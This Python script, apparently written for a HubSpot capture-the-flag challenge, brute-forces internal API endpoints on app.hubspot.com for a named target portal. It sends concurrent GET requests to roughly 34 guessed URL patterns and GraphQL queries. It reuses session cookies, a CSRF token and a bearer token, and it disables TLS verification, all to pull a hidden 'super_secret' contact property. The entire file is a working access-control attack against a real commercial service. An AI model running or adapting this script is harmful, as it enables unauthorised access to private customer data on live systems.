#!/usr/bin/env python3
"""
Ultra-Aggressive API Endpoint Discovery
Brute force all possible internal API patterns
"""

import requests
import json
import os
import urllib3
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

print("="*80)
print("ULTRA-AGGRESSIVE API ENDPOINT DISCOVERY")
print("="*80)
print(f"Testing ALL possible API patterns...")
print("="*80)

findings = []

# Comprehensive headers
session_headers = {
    'Cookie': SESSION_COOKIES,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
    'Origin': 'https://app.hubspot.com',
}

if csrf_token:
    session_headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token
    session_headers['X-HubSpotAPI-CSRF'] = csrf_token

token_headers = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
    'Content-Type': 'application/json',
}

# ============================================================================
# BRUTE FORCE ALL API PATTERNS
# ============================================================================

contact_id = 1

# Every possible API pattern we can think of
api_patterns = [
    # Session-based patterns
    f'https://app.hubspot.com/api/crm/v1/objects/0-1/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm/v2/objects/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm/v3/objects/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm/v4/objects/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # Property-specific endpoints
    f'https://app.hubspot.com/api/contacts/v1/contact/vid/{contact_id}?portalId={TARGET_PORTAL}&property=super_secret&property=firstname',
    f'https://app.hubspot.com/api/contacts/v2/contacts/{contact_id}?portalId={TARGET_PORTAL}&properties=super_secret&properties=firstname',
    f'https://app.hubspot.com/api/contacts/v3/contacts/{contact_id}?portalId={TARGET_PORTAL}&properties=super_secret,firstname',

    # Record endpoints
    f'https://app.hubspot.com/api/records/v1/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/records/v2/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/record/0-1/{contact_id}?portalId={TARGET_PORTAL}',

    # Data endpoints
    f'https://app.hubspot.com/api/data/v1/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/data/v2/objects/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # Internal endpoints
    f'https://app.hubspot.com/api/internal/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/internal-api/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/v1/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # UI endpoints
    f'https://app.hubspot.com/ui-api/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/ui/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/frontend-api/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # BFF (Backend for Frontend) patterns
    f'https://app.hubspot.com/bff/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/bff/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # Service-specific endpoints
    f'https://app.hubspot.com/contacts-service/v1/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/crm-service/v1/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # GraphQL attempts
    f'https://app.hubspot.com/api/graphql/v1?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/graphql/v1?portalId={TARGET_PORTAL}',

    # Public/private API split
    f'https://app.hubspot.com/private-api/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/private/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # Portal-specific endpoints
    f'https://app.hubspot.com/portals/{TARGET_PORTAL}/contacts/{contact_id}',
    f'https://app.hubspot.com/api/portals/{TARGET_PORTAL}/contacts/{contact_id}',
    f'https://app.hubspot.com/{TARGET_PORTAL}/api/contacts/{contact_id}',

    # REST variations
    f'https://app.hubspot.com/rest/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/rest/contacts/{contact_id}?portalId={TARGET_PORTAL}',

    # Versioned patterns
    f'https://app.hubspot.com/v1/api/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/v2/api/contacts/{contact_id}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/v3/api/contacts/{contact_id}?portalId={TARGET_PORTAL}',
]

# GraphQL queries to try if we find a working endpoint
graphql_queries = [
    {
        "query": f"""
        query {{
            contact(id: "{contact_id}", portalId: {TARGET_PORTAL}) {{
                id
                properties {{
                    super_secret
                    firstname
                    email
                }}
            }}
        }}
        """
    },
    {
        "query": f"""
        {{
            contacts(portalId: {TARGET_PORTAL}, first: 1) {{
                edges {{
                    node {{
                        id
                        super_secret
                        firstname
                    }}
                }}
            }}
        }}
        """
    },
]

print(f"\n[*] Testing {len(api_patterns)} API patterns...")

def test_endpoint(url):
    """Test a single endpoint"""
    try:
        # Try with session headers
        r = requests.get(url, headers=session_headers, verify=False, timeout=5)

        if r.status_code == 200:
            try:
                data = r.json()

                # Check for contact data
                if any(key in str(data).lower() for key in ['properties', 'contact', 'firstname', 'super_secret']):
                    print(f"\n  *** POTENTIAL HIT: {url.split('.com')[1][:80]}")
                    print(f"      Status: {r.status_code}")
                    print(f"      Data: {json.dumps(data, indent=2)[:300]}")

                    # Check for super_secret
                    data_str = json.dumps(data)
                    if 'super_secret' in data_str.lower():
                        print(f"\n  ========================================")
                        print(f"  *** SUPER_SECRET FOUND ***")
                        print(f"  ========================================")
                        print(f"  URL: {url}")
                        print(f"  Data: {json.dumps(data, indent=2)}")
                        print(f"  ========================================")

                        return {'success': True, 'url': url, 'data': data}

                    return {'potential': True, 'url': url, 'data': data}

            except:
                # Not JSON, but 200 - might be HTML
                if len(r.text) > 100 and 'super_secret' in r.text.lower():
                    print(f"\n  *** FOUND in HTML: {url.split('.com')[1][:80]}")
                    return {'potential': True, 'url': url, 'html': r.text[:500]}

        # Also try with token headers
        if r.status_code != 200:
            r2 = requests.get(url, headers=token_headers, verify=False, timeout=5)
            if r2.status_code == 200:
                try:
                    data = r2.json()
                    if 'super_secret' in json.dumps(data).lower():
                        print(f"\n  *** FOUND with token: {url}")
                        return {'success': True, 'url': url, 'data': data, 'auth': 'token'}
                except:
                    pass

    except:
        pass

    return None

# Test all endpoints concurrently
results = []
with ThreadPoolExecutor(max_workers=20) as executor:
    future_to_url = {executor.submit(test_endpoint, url): url for url in api_patterns}

    for future in as_completed(future_to_url):
        result = future.result()
        if result:
            results.append(result)
            if result.get('success'):
                findings.append(result)

print(f"\n\n{'='*80}")
print(f"Endpoint Discovery Complete")
print(f"{'='*80}")
print(f"Total tested: {len(api_patterns)}")
print(f"Potential hits: {len(results)}")
print(f"Successful finds: {len([r for r in results if r.get('success')])}")

if findings:
    print(f"\n*** SUCCESS ***\n")
    for finding in findings:
        print(f"URL: {finding['url']}")
        print(f"Data: {json.dumps(finding.get('data', {}), indent=2)[:500]}")
        print()

# ============================================================================
# IF NO SUCCESS, TRY GRAPHQL
# ============================================================================

if not findings:
    print(f"\n[*] Trying GraphQL endpoints...")

    for gql_url in ['https://app.hubspot.com/api/graphql', 'https://app.hubspot.com/graphql']:
        for query in graphql_queries:
            try:
                r = requests.post(gql_url, headers=session_headers, json=query, verify=False, timeout=5)

                if r.status_code == 200:
                    data = r.json()
                    if 'super_secret' in json.dumps(data).lower():
                        print(f"\n*** GraphQL SUCCESS at {gql_url} ***")
                        print(json.dumps(data, indent=2))
                        findings.append({'url': gql_url, 'data': data, 'type': 'graphql'})
            except:
                pass

# ============================================================================
# SAVE RESULTS
# ============================================================================

if findings:
    with open('/home/user/Hub/findings/endpoint_discovery_success.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print(f"\n{'='*80}")
    print("CTF FLAG FOUND!")
    print(f"{'='*80}")
    print(f"Saved to: findings/endpoint_discovery_success.json")
else:
    print(f"\nNo working endpoints found with current session.")
    print("Session cookies may need to be absolutely fresh (< 1 minute old)")
